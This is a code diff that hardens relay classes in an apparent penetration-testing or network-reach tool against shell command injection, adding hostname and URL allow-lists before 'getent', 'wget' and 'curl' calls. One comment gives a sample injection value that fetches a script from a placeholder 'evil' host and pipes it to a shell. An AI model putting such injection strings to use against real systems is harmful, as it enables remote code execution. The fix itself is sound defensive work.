@@ -103,6 +103,43 @@ def _safe_targets(hosts_ports: Sequence[Tuple[str, int]]) -> List[Tuple[str, int
     return out
 
 
+# A shell-safe URL: scheme + host + optional port/path with only URL-legal characters. A
+# malicious hostname (e.g. "foo; curl evil|sh") or URL with shell metacharacters would
+# otherwise be interpolated straight into the relay's `/bin/sh -c` script (CWE-78, V4).
+_URL_RE = re.compile(r"^https?://[A-Za-z0-9._:\-]{1,255}(?:/[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%\-]*)?$")
+
+
+def _safe_host(hostname: str) -> Optional[str]:
+    """Return the hostname if it is a literal host/IP safe to place in a shell command,
+    else None. Same allow-list as _safe_targets (V4)."""
+    if hostname is None:
+        return None
+    h = str(hostname).strip()
+    return h if _HOST_RE.match(h) else None
+
+
+def _safe_url(url: str) -> Optional[str]:
+    """Return the URL if it is safe to place (single-quoted) in a shell command, else None.
+
+    Rejects anything with a non-http(s) scheme, a single quote (which would break out of
+    the quoting), or any character outside a conservative URL-legal set (V4).
+    """
+    if url is None:
+        return None
+    u = str(url).strip()
+    if "'" in u or not _URL_RE.match(u):
+        return None
+    try:
+        parsed = urlparse(u)
+    except ValueError:
+        return None
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        return None
+    if not _HOST_RE.match(parsed.hostname):
+        return None
+    return u
+
+
 class Relay:
     """Base relay: a way to reach further hosts from a (possibly proven) vantage point."""
 
@@ -271,6 +308,9 @@ class DockerRelay(Relay):
 
     def resolve(self, hostname: str) -> Optional[str]:
         """DNS lookup from inside the Docker foothold's network namespace."""
+        hostname = _safe_host(hostname)
+        if hostname is None:
+            return None
         base = self._resolve_base()
         if not base:
             return None
@@ -314,6 +354,9 @@ class DockerRelay(Relay):
 
     def http_probe(self, url: str, *, timeout: Optional[float] = None) -> Optional[int]:
         """HTTP GET from inside the Docker foothold's network namespace via wget."""
+        url = _safe_url(url)
+        if url is None:
+            return None
         base = self._resolve_base()
         if not base:
             return None
@@ -462,6 +505,9 @@ class KubeletRelay(Relay):
         return out
 
     def resolve(self, hostname: str) -> Optional[str]:
+        hostname = _safe_host(hostname)
+        if hostname is None:
+            return None
         result = self._exec_cmd(f"getent hosts {hostname} 2>/dev/null | head -1 | awk '{{print $1}}'")
         if result:
             ip = result.strip().split("\n")[-1].strip()
@@ -473,6 +519,9 @@ class KubeletRelay(Relay):
         return None
 
     def http_probe(self, url: str, *, timeout: Optional[float] = None) -> Optional[int]:
+        url = _safe_url(url)
+        if url is None:
+            return None
         to = int(timeout or _SERVICE_HTTP_PROBE_TIMEOUT)
         result = self._exec_cmd(f"wget -q -S --spider -T {to} '{url}' 2>&1 | head -5")
         if result:
@@ -563,6 +612,9 @@ class K8sApiRelay(Relay):
         return out
 
     def resolve(self, hostname: str) -> Optional[str]:
+        hostname = _safe_host(hostname)
+        if hostname is None:
+            return None
         result = self._exec_cmd(f"getent hosts {hostname} 2>/dev/null | head -1 | awk '{{print $1}}'")
         if result:
             ip = result.strip().split("\n")[-1].strip()
@@ -574,6 +626,9 @@ class K8sApiRelay(Relay):
         return None
 
     def http_probe(self, url: str, *, timeout: Optional[float] = None) -> Optional[int]:
+        url = _safe_url(url)
+        if url is None:
+            return None
         to = int(timeout or _SERVICE_HTTP_PROBE_TIMEOUT)
         result = self._exec_cmd(f"wget -q -S --spider -T {to} '{url}' 2>&1 | head -5")
         if result:
@@ -811,6 +866,9 @@ class SSHRelay(Relay):
         return None
 
     def resolve(self, hostname: str) -> Optional[str]:
+        hostname = _safe_host(hostname)
+        if hostname is None:
+            return None
         result = self._exec_cmd(
             f"getent hosts {hostname} 2>/dev/null | head -1 | awk '{{print $1}}'")
         if result:
@@ -823,6 +881,9 @@ class SSHRelay(Relay):
         return None
 
     def http_probe(self, url: str, *, timeout: Optional[float] = None) -> Optional[int]:
+        url = _safe_url(url)
+        if url is None:
+            return None
         to = int(timeout or _SERVICE_HTTP_PROBE_TIMEOUT)
         result = self._exec_cmd(
             f"curl -sS -o /dev/null -w '%{{http_code}}' --connect-timeout {to} '{url}' 2>/dev/null "
